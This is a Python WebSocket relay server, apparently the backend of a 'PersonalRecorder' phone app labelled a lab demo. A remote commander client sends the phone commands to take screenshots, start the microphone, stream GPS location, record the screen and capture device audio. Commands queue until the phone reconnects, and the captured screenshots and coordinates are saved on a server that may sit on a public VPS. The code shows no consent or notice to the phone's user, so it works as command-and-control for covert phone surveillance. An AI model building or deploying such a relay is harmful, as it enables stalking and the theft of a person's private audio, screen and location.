#!/usr/bin/env python3
"""Lab relay server for the PersonalRecorder demo app.

The app connects here over WebSocket and streams events/screenshots.
Run it where the phone can reach it: same Wi-Fi LAN, or a VPS with a public
address when the phone is on another network.

Setup:
    pip install websockets
    python3 relay_server.py --out ./relay_out

Then on the phone, connect to ws://<this-machine-ip>:8765
(For TLS use --cert/--key and connect to wss://... -- see gen_cert.sh.)

Command relay (steady mode):
    - A "commander" client (send_command.py) pushes commands such as
        python3 send_command.py capture
        python3 send_command.py record_start
        python3 send_command.py deviceaudio_start
      and the relay forwards them to the connected phone.
    - If the phone is offline (network switch, airplane mode, ...) the
      command is queued (TTL 300 s) and delivered on the next reconnect,
      so nothing is silently lost while the phone is between networks.
    - The relay replies to the commander with {"type":"cmd_accepted"} and
      the app confirms execution with {"type":"ack"}.
"""
from __future__ import annotations

import argparse
import asyncio
import base64
import binascii
import json
import pathlib
import ssl
import time
from typing import Optional

import websockets

# Command types a commander client may send; the relay forwards them to the phone.
COMMAND_TYPES = {
    "capture",
    "mic_start", "mic_stop",
    "location_start", "location_stop",
    "record_start", "record_stop",
    "deviceaudio_start", "deviceaudio_stop",
}

PENDING_TTL_SECONDS = 300  # queued commands older than this are dropped

# Single-phone lab: the current device connection, replaced on reconnect.
device_ws: Optional[websockets.WebSocketServerProtocol] = None
pending_commands: list[dict] = []


async def handle_message(msg: dict, out_dir: pathlib.Path) -> None:
    mtype = msg.get("type", "?")
    payload = msg.get("payload") or {}
    ts = msg.get("ts", "?")

    if mtype == "capture_started":
        print(f"[event] screen capture started: {payload}")
    elif mtype in ("capture_paused", "capture_resumed"):
        print(f"[event] {mtype}: {payload}")
    elif mtype == "screenshot_skipped":
        print(f"[event] screenshot skipped ({payload.get('reason')}), "
              f"total skipped={payload.get('skipped')}")
    elif mtype == "audio_started":
        print(f"[event] audio started: {payload}")
    elif mtype == "audio_stopped":
        print(f"[event] audio stopped: {payload}")
    elif mtype in ("recording_started", "recording_stopped", "recording_error"):
        print(f"[event] {mtype}: {payload}")
    elif mtype in ("deviceaudio_started", "deviceaudio_stopped", "deviceaudio_error"):
        print(f"[event] {mtype}: {payload}")
    elif mtype == "location_started":
        print(f"[event] location stream started: {payload}")
    elif mtype == "location_stopped":
        print("[event] location stream stopped")
    elif mtype == "location":
        print(f"[location] lat={payload.get('lat')} lon={payload.get('lon')} "
              f"accuracy={payload.get('accuracy')}")
    elif mtype == "ack":
        print(f"[ack] device confirmed command '{payload.get('cmd')}'")
    elif mtype == "screenshot":
        data = payload.get("data", "")
        if data:
            try:
                raw = base64.b64decode(data)
                shot = out_dir / f"shot_{ts}.jpg"
                shot.write_bytes(raw)
                print(f"[screenshot] saved {shot} ({len(raw)} bytes) "
                      f"src={payload.get('path')} {payload.get('width')}x{payload.get('height')}")
            except (binascii.Error, ValueError) as exc:
                print(f"[screenshot] bad payload: {exc}")
    else:
        print(f"[unknown] {mtype}: {payload}")


async def announce_device(ws) -> None:
    queued = len(pending_commands)
    suffix = f" -- {queued} queued command(s) will be delivered" if queued else ""
    print(f"[+] device connected from {ws.remote_address}{suffix}")


async def flush_pending() -> None:
    """Deliver commands queued while the phone was offline."""
    global pending_commands
    if not pending_commands or device_ws is None:
        return
    now = time.time()
    still_pending: list[dict] = []
    for cmd in pending_commands:
        if now - cmd["ts"] > PENDING_TTL_SECONDS:
            print(f"[queue] dropped expired '{cmd['type']}' "
                  f"(queued {int(now - cmd['ts'])} s > {PENDING_TTL_SECONDS} s)")
            continue
        try:
            await device_ws.send(json.dumps({"type": cmd["type"]}))
            print(f"[>] delivered queued command '{cmd['type']}' (was offline)")
        except Exception as exc:
            print(f"[!] flush failed for '{cmd['type']}': {exc}")
            still_pending.append(cmd)
    pending_commands = still_pending


async def handle_command(ws, msg: dict) -> None:
    """A commander sent a command: forward to the phone, or queue it."""
    cmd = msg.get("type")
    if device_ws is None:
        pending_commands.append({"type": cmd, "ts": time.time()})
        print(f"[queue] device offline -- '{cmd}' queued "
              f"({len(pending_commands)} pending, TTL {PENDING_TTL_SECONDS} s)")
        await ws.send(json.dumps({"type": "cmd_accepted", "queued": True,
                                  "cmd": cmd, "pending": len(pending_commands)}))
        return
    try:
        await device_ws.send(json.dumps(msg))
        await ws.send(json.dumps({"type": "cmd_accepted", "queued": False, "cmd": cmd}))
        print(f"[>] forwarded command '{cmd}' to device")
    except Exception as exc:
        print(f"[!] forward to device failed: {exc}")


async def client(ws, out_dir: pathlib.Path) -> None:
    """One WebSocket connection: the phone, or a transient commander.

    The phone is recognised by sending event/telemetry messages (anything
    that is not a command); commanders only ever send command types.
    """
    global device_ws
    role = "client"
    try:
        async for raw in ws:
            try:
                msg = json.loads(raw)
            except json.JSONDecodeError:
                print(f"[!] non-JSON message ignored: {raw[:120]!r}")
                continue
            mtype = msg.get("type", "?")
            if mtype in COMMAND_TYPES:
                role = "commander"
                await handle_command(ws, msg)
            else:
                role = "device"
                if device_ws is not ws:
                    device_ws = ws
                    await announce_device(ws)
                    await flush_pending()
                await handle_message(msg, out_dir)
    except websockets.ConnectionClosed:
        pass
    finally:
        if device_ws is ws:
            device_ws = None
            print(f"[-] device offline from {ws.remote_address} -- "
                  "commands sent while offline will be queued")
        else:
            print(f"[-] stale {role} connection closed ({ws.remote_address})")


async def main() -> None:
    parser = argparse.ArgumentParser(description="PersonalRecorder lab relay")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8765)
    parser.add_argument("--out", type=pathlib.Path, default=pathlib.Path("./relay_out"))
    parser.add_argument("--cert", default=None, help="server.pem from gen_cert.sh (enables wss)")
    parser.add_argument("--key", default=None, help="server.key from gen_cert.sh")
    args = parser.parse_args()

    args.out.mkdir(parents=True, exist_ok=True)

    ssl_ctx = None
    scheme = "ws"
    if args.cert and args.key:
        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_ctx.load_cert_chain(args.cert, args.key)
        scheme = "wss"

    print(f"[*] relay listening on {scheme}://{args.host}:{args.port}, "
          f"saving to {args.out.resolve()}")
    print("[*] offline commands are queued for 300 s and delivered on reconnect")

    # websockets calls the handler with just the connection, so bind out_dir
    # explicitly rather than relying on argument order.
    async with websockets.serve(lambda ws: client(ws, args.out), args.host, args.port, ssl=ssl_ctx):
        await asyncio.Future()  # run forever


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] stopped")